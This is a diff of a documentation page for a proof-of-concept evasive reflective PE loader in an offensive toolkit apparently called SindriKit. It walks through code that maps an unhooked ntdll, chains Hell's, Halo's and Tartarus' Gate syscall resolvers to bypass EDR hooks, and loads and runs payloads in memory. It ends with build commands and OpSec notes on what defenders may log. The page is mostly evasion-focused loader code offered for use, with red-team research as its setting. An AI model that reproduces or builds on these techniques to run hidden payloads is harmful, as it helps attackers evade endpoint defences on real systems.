@@ -2,70 +2,95 @@
 
 **Location:** `pocs/loader_nowinapi/`
 
-This PoC drops the entire Win32 API layer. It retrieves a clean `ntdll.dll` from KnownDlls, configures a cascading SSN resolution pipeline, and then loads the payload using only direct kernel syscalls and PEB walking.
+Evasive local reflective loading without Win32 memory/module APIs. Uses NT API resolution (`snd_mem_nt`, `snd_mod_nt`) after bootstrapping the syscall pipeline with a clean `ntdll` base.
 
 ## What it demonstrates
 
-- The full SindriKit bootstrapping sequence required before any native primitive can be used.
-- The complete cascading syscall pipeline covering four EDR hook evasion strategies.
-- That the loader's core logic is entirely unchanged — only the injected API tables differ from `loader_winapi`.
+- Syscall pipeline bootstrap (`snd_syscall_set_ntdll`, cascading resolvers)
+- Same loader chain as `loader_winapi` with different injected API tables
+- Three commented alternatives for obtaining `ntdll` (disk, PEB, KnownDlls)
+- DLL export FFI (`-e`/`-a`) identical to the Win32 PoC
+
+## Command-line usage
+
+Same flags as `loader_winapi`:
+
+```text
+loader_nowinapi -f <payload_path> [-e <export_name>] [-a <arg>]...
+```
 
 ## Walkthrough
 
-The bootstrapping phase must complete before the loader context is initialized.
+### 1. Bootstrap `ntdll` for syscall resolution
 
-### Step 1: Retrieve a clean `ntdll.dll` from KnownDlls
-
-```c
-PVOID clean_ntdll = NULL;
-
-// Configure the KnownDlls loader to use Win32 wrappers for the initial bootstrap.
-// (Native strategy is available once the syscall pipeline itself is armed.)
-snd_status_t status = snd_map_knowndll(&snd_knowndlls_win, L"ntdll.dll", &clean_ntdll);
-```
-
-This maps a clean, pre-hook copy of `ntdll.dll` directly from the `\KnownDlls` Object Manager directory. The EDR's hooks on the PEB-resident copy do not exist in this mapping.
-
-### Step 2: Feed the clean base to the global cache
+The PoC loads `ntdll.dll` from disk into a buffer and registers it as the syscall scan base:
 
 ```c
-snd_set_ntdll(clean_ntdll);
+snd_buffer_t ntdll_buf = {0};
+status = snd_disk_buffer_load("C:\\Windows\\System32\\ntdll.dll", &ntdll_buf);
+PVOID ntdll = ntdll_buf.data;
+
+snd_syscall_set_ntdll(ntdll);
+snd_syscall_strategy_set(snd_syscall_resolve_ssn_scan);
+snd_syscall_strategy_add(snd_syscall_resolve_ssn_sort);
 ```
 
-This globally registers the unhooked `ntdll.dll` base. It will be used by the syscall resolution pipeline to extract unhooked stub bytes, and by the Native module API (`snd_mod_native`) to implicitly resolve APIs like `LdrLoadDll` without additional PEB lookups.
-
-### Step 3: Configure the cascading syscall pipeline
+Commented alternatives in `pocs/loader_nowinapi/main.c` (swap in for different OpSec trade-offs):
 
 ```c
-snd_set_syscall_strategy(snd_hell_extract_syscall);
-snd_add_syscall_strategy(snd_halo_extract_syscall);
-snd_add_syscall_strategy(snd_tartarus_extract_syscall);
-snd_add_syscall_strategy(snd_veles_extract_syscall);
+// PEB walk — no disk read (correct API):
+status = snd_peb_get_module_base_hash(SND_HASH_NTDLL_DLL, &ntdll);
+
+// KnownDlls — unhooked section mapping
+status = snd_om_knowndll_map(&snd_map_nt, L"ntdll.dll", &ntdll);
 ```
 
-`snd_resolve_syscall` will now attempt each strategy in order, returning on the first success. This covers unhooked stubs (Hell's Gate), `0xE9`-hooked stubs (Halo's Gate), `0xEB`-hooked stubs (Tartarus' Gate), and the `syscall`-anchor fallback (VelesReek).
+> [!NOTE]
+> The commented PEB block in source currently calls `snd_peb_get_module_base(SND_HASH_NTDLL_DLL, …)` — that is incorrect (first argument must be a wide module name, not a hash). Use `snd_peb_get_module_base_hash` as shown above.
 
-### Step 4: Load the payload and initialize the loader context
+### 2. Inject NT primitives
 
 ```c
-snd_buffer_t payload = { ... };  // raw PE bytes from disk
-
-snd_loader_ctx_t ctx = {0};
-ctx.raw_source = &payload;
-ctx.mem_api    = &snd_mem_native;  // -> NtAllocateVirtualMemory via direct syscall
-ctx.mod_api    = &snd_mod_native;  // -> PEB walking + manual export table parsing
+ctx.mem_api = &snd_mem_nt;   // NtAllocateVirtualMemory via PEB + EAT
+ctx.mod_api = &snd_mod_nt;   // PEB walk + manual export parsing
 ```
 
-### Step 5: Execute
+> [!NOTE]
+> This PoC uses `_nt` backends, not `_sys`. The syscall pipeline is bootstrapped so you can swap `ctx.mem_api` to `&snd_mem_sys` without other changes. See [inject_pe.md](inject_pe.md) for a full `_sys` profile.
+
+### 3. Load, prepare, execute
 
 ```c
-snd_status_t s = snd_prepare_reflective_image(&ctx);
-if (s.code != SND_SUCCESS) {
-    snd_status_print(s);
-    return 1;
-}
+status = snd_disk_buffer_load(file_path, &file_buf);
+ctx.raw_source = &file_buf;
 
-s = snd_execute_reflective_image(&ctx);
+status = snd_ldr_pe_prepare_image(&ctx);
+status = snd_ldr_pe_execute_image(&ctx);
+
+// Optional DLL export via snd_ldr_pe_get_proc_address + snd_ffi_execute
 ```
 
-**OpSec impact:** `VirtualAlloc` and `VirtualProtect` are never called. Memory allocation goes directly to `NtAllocateVirtualMemory` via the SSN resolved from the clean KnownDlls ntdll copy. Import resolution uses PEB walking for module base lookup and manual export table parsing for symbol resolution.
+### 4. Cleanup
+
+```c
+snd_ldr_pe_detach_image(&ctx);
+snd_ldr_pe_free_mapped_image(&ctx);
+snd_buffer_free(&file_buf);
+```
+
+## Building
+
+```bash
+cmake -B build -DSND_BUILD_PAYLOADS=ON
+cmake --build build --config Release
+```
+
+## OpSec impact
+
+Avoids `VirtualAlloc`, `LoadLibraryA`, and `GetProcAddress`. Memory and imports still execute through in-process `ntdll` stubs (inline hooks may fire). Disk read of `ntdll.dll` may be logged by AV.
+
+## See also
+
+- [Syscall pipeline](../domains/primitives/syscalls/pipeline.md)
+- [loader_winapi.md](loader_winapi.md) — Win32 baseline
+- [inject_pe.md](inject_pe.md) — full `_sys` cross-process profile
